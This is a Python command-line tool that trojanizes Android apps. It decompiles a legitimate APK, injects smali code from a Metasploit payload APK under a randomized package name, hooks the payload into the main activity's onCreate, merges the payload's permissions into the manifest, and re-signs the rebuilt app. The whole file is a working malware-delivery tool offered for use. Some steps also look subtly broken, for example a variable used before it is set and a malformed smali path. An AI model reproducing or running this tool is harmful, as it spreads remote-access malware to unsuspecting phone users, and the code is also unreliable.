#!/usr/bin/env python3

import os
import re
import shutil
import subprocess
import argparse
import string
import random
import xml.etree.ElementTree as ET
from pathlib import Path

class AndroidInjector:

    def __init__(self, target_apk, payload_apk, keystore='', keystore_pass='', key_alias=''):
        self.target_apk = target_apk
        self.payload_apk = payload_apk
        self.keystore = keystore
        self.keystore_pass = keystore_pass
        self.key_alias = key_alias
        self.work_dir = Path.home() / '.android_injector'
        self.work_dir.mkdir(exist_ok=True)

    def execute(self):
        self.original_dir = Path.cwd()
        self.decompile_apks()
        self.main_activity = self.find_main_activity()
        print(f'[+] Main Activity identified: {self.main_activity}')
        self.inject_payload(self.main_activity)
        self.merge_payload_files()
        self.update_manifest()
        self.recompile_apk(self.work_dir / 'target_apk')
        self.sign_apk()

    def generate_random_string(self, length=10):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def merge_payload_files(self):
        print('[+] Merging payload files...')
        os.chdir(self.work_dir / 'payload_apk')
        self.execute_command('tar -cf - smali | (cd ../target_apk; tar -xpf -)')

        payload_dir = self.work_dir / 'target_apk' / 'smali' / 'com'
        self.payload_package = self.generate_random_string()
        (payload_dir / 'metasploit').rename(payload_dir / self.payload_package)
        os.chdir(payload_dir / self.payload_package / 'stage')
        self.execute_command(f"sed -i 's/metasploit/{self.payload_package}/g' *")

    def update_manifest(self):
        print('[+] Updating AndroidManifest.xml')
        target_manifest = ET.parse(self.target_manifest)
        payload_manifest = ET.parse(self.payload_manifest)
        
        ns = {'android': 'http://schemas.android.com/apk/res/android'}
        
        permissions = set(elem.attrib['{http://schemas.android.com/apk/res/android}name'] for elem in payload_manifest.findall('.//uses-permission'))
        features = set(elem.attrib['{http://schemas.android.com/apk/res/android}name'] for elem in payload_manifest.findall('.//uses-feature'))
        
        app_elem = target_manifest.find('.//application')
        for perm in permissions:
            ET.SubElement(target_manifest.getroot(), 'uses-permission', {'android:name': perm})
        for feature in features:
            ET.SubElement(target_manifest.getroot(), 'uses-feature', {'android:name': feature})
        
        target_manifest.write(self.target_manifest, encoding='utf-8', xml_declaration=True)

    def inject_payload(self, main_activity):
        payload_path = f'com/{self.payload_package}/stage/Payload'
        injection_code = f'    invoke-static {{p0}}, L{payload_path};->start(Landroid/content/Context;)V\n'

        activity_path = self.work_dir / 'target_apk' / 'smali' / main_activity.replace('.', '/') / '.smali'
        temp_file = self.work_dir / 'temp.smali'

        with open(activity_path, 'r') as original, open(temp_file, 'w') as modified:
            for line in original:
                modified.write(line)
                if re.match(r'^\.method.+onCreate\(Landroid', line):
                    modified.write(injection_code)

        temp_file.replace(activity_path)

    def decompile_apks(self):
        target_dir = self.work_dir / 'target_apk'
        payload_dir = self.work_dir / 'payload_apk'
        print(f'[+] Decompiling target APK: {self.target_apk}')
        self.execute_command(f'apktool d -f {self.target_apk} -o {target_dir}')
        print(f'[+] Decompiling payload APK: {self.payload_apk}')
        self.execute_command(f'apktool d -f {self.payload_apk} -o {payload_dir}')
        self.target_manifest = target_dir / 'AndroidManifest.xml'
        self.payload_manifest = payload_dir / 'AndroidManifest.xml'

    def recompile_apk(self, apk_dir):
        print(f'[+] Recompiling APK: {apk_dir}')
        self.execute_command(f'apktool b {apk_dir}')
        shutil.copy(apk_dir / 'dist' / self.target_apk, self.work_dir / 'injected.apk')

    def sign_apk(self):
        os.chdir(self.original_dir)
        apk_path = self.work_dir / 'injected.apk'

        if not Path(self.keystore).exists():
            print('[+] Creating new self-signed keystore')
            self.keystore_pass = self.generate_random_string()
            self.keystore = self.work_dir / 'temp.keystore'
            self.key_alias = 'temp_alias'
            keytool_cmd = (
                f'keytool -genkey -v -keystore {self.keystore} '
                f'-alias {self.key_alias} -keyalg RSA -keysize 2048 '
                f'-validity 10000 -storepass {self.keystore_pass} -dname "CN=TempCert"'
            )
            self.execute_command(keytool_cmd)

        print(f'[+] Signing APK: {apk_path}')
        sign_cmd = (
            f'jarsigner -verbose -keystore {self.keystore} '
            f'-storepass {self.keystore_pass} '
            f'-digestalg SHA-256 -sigalg SHA256withRSA '
            f'{apk_path} {self.key_alias}'
        )
        self.execute_command(sign_cmd)

    def execute_command(self, cmd):
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Command failed: {result.stderr}")
        return result.stdout

    def find_main_activity(self):
        root = ET.parse(self.target_manifest).getroot()
        ns = {'android': 'http://schemas.android.com/apk/res/android'}
        
        for activity in root.findall('.//activity'):
            for intent_filter in activity.findall('intent-filter'):
                if intent_filter.find("action[@android:name='android.intent.action.MAIN']", namespaces=ns) is not None:
                    return activity.attrib['{http://schemas.android.com/apk/res/android}name']
        
        raise Exception("Main activity not found in AndroidManifest.xml")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Android APK Payload Injector')
    parser.add_argument('target_apk', help='Target Android APK to inject payload into')
    parser.add_argument('payload_apk', help='Payload APK file')
    parser.add_argument('-ks', '--keystore', default='debug.keystore', help='Android keystore file')
    parser.add_argument('-kp', '--keystore_pass', default='android', help='Android keystore password')
    parser.add_argument('-ka', '--key_alias', default='androiddebugkey', help='Android keystore key alias')
    
    print("""
[*]=====================================
[*] Android Payload Injector Version 2.0
[*] Author: SGNinja
[*] Copyright (c) 2024
[*]=====================================
    """)
    
    args = parser.parse_args()
    injector = AndroidInjector(
        args.target_apk, args.payload_apk,
        keystore=args.keystore,
        keystore_pass=args.keystore_pass,
        key_alias=args.key_alias
    )
    injector.execute()
